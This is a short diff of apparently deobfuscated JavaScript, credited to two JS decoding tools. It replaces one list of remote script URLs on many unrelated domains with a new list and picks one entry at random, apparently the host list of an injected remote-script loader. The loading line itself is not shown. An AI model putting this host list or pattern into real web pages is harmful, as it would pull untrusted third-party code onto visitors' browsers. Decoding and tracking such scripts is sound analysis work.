@@ -1,5 +1,5 @@
-//Thu Jul 31 2025 08:33:10 GMT+0000 (Coordinated Universal Time)
+//Thu Jul 31 2025 08:41:06 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-arr = ["//tmf239.com/jang.js", "//tz55555.com/jang.js", "//xuanxuangh.com/jang.js", "//tmf935.com/jang.js", "//wzweny.com/jang.js", "//subaici.com/jang.js", "//remencptj.com/jang.js", "//wohuikaoshang.com/jang.js", "//shyl9898.com/jang.js", "//hzlcznkj.com/jang.js", "//viuxnao.com/jang.js", "//bagan-ai.com/jang.js", "//ytjuyong.com/jang.js", "//zq-bangzao.com/jang.js", "//xzlichuang.com/jang.js", "//sutaiobd.com/jang.js", "//yichijiaoyu.com/jang.js", "//huangshanjh.com/jang.js", "//gzenqiao.com/jang.js", "//dycaijin.com/jang.js", "//tianhuile886.com/jang.js", "//yingzaiziran.com/jang.js", "//19yunqian.com/jang.js", "//tianguzhipin.com/jang.js", "//hzwxkjdl.com/jang.js", "//yxbj5.com/jang.js", "//xuewuyoujy.com/jang.js", "//wxxbjd.com/jang.js"];
+arr = ["//7al87.com/didi.js", "//w7po6e.com/didi.js", "//i0m67h.com/didi.js", "//huahaomiaohao.com/didi.js", "//qjmj2018.com/didi.js"];
 var randomArr = arr[Math.floor(Math.random() * arr.length)];
